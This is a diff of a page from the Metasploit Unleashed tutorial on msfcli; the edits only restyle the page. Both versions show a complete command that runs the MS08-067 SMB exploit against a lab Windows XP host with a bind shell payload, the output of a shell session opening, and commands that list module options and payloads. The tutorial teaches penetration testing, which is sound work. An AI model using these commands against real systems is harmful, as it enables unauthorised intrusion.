@@ -4,7 +4,7 @@
   <meta content="text/html; charset=ISO-8859-1"
  http-equiv="Content-Type">
   <title>msfcli</title>
-</head>
+<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
 <body>
 <h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">msfcli</h1>
 <h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
@@ -28,7 +28,7 @@ all options are case-sensitive.
 <br>
 <br>
 </p>
-<pre style="color: rgb(0, 0, 0);">root@bt4:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.1.201 PAYLOAD=windows/shell/bind_tcp E<br>[*] Please wait while we load the module tree...<br><br>                                  _<br>                                 | |      o<br> _  _  _    _ _|_  __,   ,    _  | |  __    _|_<br>/ |/ |/ |  |/  |  /  |  / \_|/ \_|/  /  \_|  |<br>  |  |  |_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/<br>                           /|<br>                           \|<br><br><br>       =[ metasploit v3.5.1-dev [core:3.5 api:1.0]<br>+ -- --=[ 676 exploits - 328 auxiliary<br>+ -- --=[ 215 payloads - 27 encoders - 8 nops<br>       =[ svn r11084 updated today (2010.11.21)<br><br>RHOST =&gt; 192.168.1.201<br>PAYLOAD =&gt; windows/shell/bind_tcp<br>[*] Started bind handler<br>[*] Automatically detecting the target...<br>[*] Fingerprint: Windows XP Service Pack 2 - lang:English<br>[*] Selected Target: Windows XP SP2 English (NX)<br>[*] Attempting to trigger the vulnerability...<br>[*] Sending stage (240 bytes) to 192.168.1.201<br>[*] Command shell session 1 opened (192.168.1.101:35009 -&gt; 192.168.1.201:4444) at 2010-11-21 14:44:42 -0700<br><br>Microsoft Windows XP [Version 5.1.2600]<br>(C) Copyright 1985-2001 Microsoft Corp.<br><br>C:\WINDOWS\system32&gt;</pre>
+<pre id="code">root@bt4:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.1.201 PAYLOAD=windows/shell/bind_tcp E<br>[*] Please wait while we load the module tree...<br><br>                                  _<br>                                 | |      o<br> _  _  _    _ _|_  __,   ,    _  | |  __    _|_<br>/ |/ |/ |  |/  |  /  |  / \_|/ \_|/  /  \_|  |<br>  |  |  |_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/<br>                           /|<br>                           \|<br><br><br>       =[ metasploit v3.5.1-dev [core:3.5 api:1.0]<br>+ -- --=[ 676 exploits - 328 auxiliary<br>+ -- --=[ 215 payloads - 27 encoders - 8 nops<br>       =[ svn r11084 updated today (2010.11.21)<br><br>RHOST =&gt; 192.168.1.201<br>PAYLOAD =&gt; windows/shell/bind_tcp<br>[*] Started bind handler<br>[*] Automatically detecting the target...<br>[*] Fingerprint: Windows XP Service Pack 2 - lang:English<br>[*] Selected Target: Windows XP SP2 English (NX)<br>[*] Attempting to trigger the vulnerability...<br>[*] Sending stage (240 bytes) to 192.168.1.201<br>[*] Command shell session 1 opened (192.168.1.101:35009 -&gt; 192.168.1.201:4444) at 2010-11-21 14:44:42 -0700<br><br>Microsoft Windows XP [Version 5.1.2600]<br>(C) Copyright 1985-2001 Microsoft Corp.<br><br>C:\WINDOWS\system32&gt;</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">If you aren't entirely sure about
 what options belong to a particular
@@ -36,14 +36,14 @@ module, you can append the letter 'O' to the end of the string at
 whichever point you are stuck.
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);">root@bt4:/pentest/exploits/framework3# ./msfcli windows/smb/ms08_067_netapi O<br>[*] Please wait while we load the module tree...<br><br>   Name     Current Setting  Required  Description<br>   ----     ---------------  --------  -----------<br>   RHOST                     yes       The target address<br>   RPORT    445              yes       Set the SMB service port<br>   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</pre>
+<pre id="code">root@bt4:/pentest/exploits/framework3# ./msfcli windows/smb/ms08_067_netapi O<br>[*] Please wait while we load the module tree...<br><br>   Name     Current Setting  Required  Description<br>   ----     ---------------  --------  -----------<br>   RHOST                     yes       The target address<br>   RPORT    445              yes       Set the SMB service port<br>   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">To display the payloads that are
 available for the current module, append the letter 'P' to the
 command-line string.
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);">root@bt4:/pentest/exploits/framework3# ./msfcli windows/smb/ms08_067_netapi RHOST=192.168.1.115 P<br>[*] Please wait while we load the module tree...<br><br>Compatible payloads<br>===================<br><br>   Name                                             Description<br>   ----                                             -----------<br>   generic/debug_trap                               Generate a debug trap in the target process<br>...snip...</pre>
+<pre id="code">root@bt4:/pentest/exploits/framework3# ./msfcli windows/smb/ms08_067_netapi RHOST=192.168.1.115 P<br>[*] Please wait while we load the module tree...<br><br>Compatible payloads<br>===================<br><br>   Name                                             Description<br>   ----                                             -----------<br>   generic/debug_trap                               Generate a debug trap in the target process<br>...snip...</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">The other options available to
 msfcli are available by issuing 'msfcli -h'.
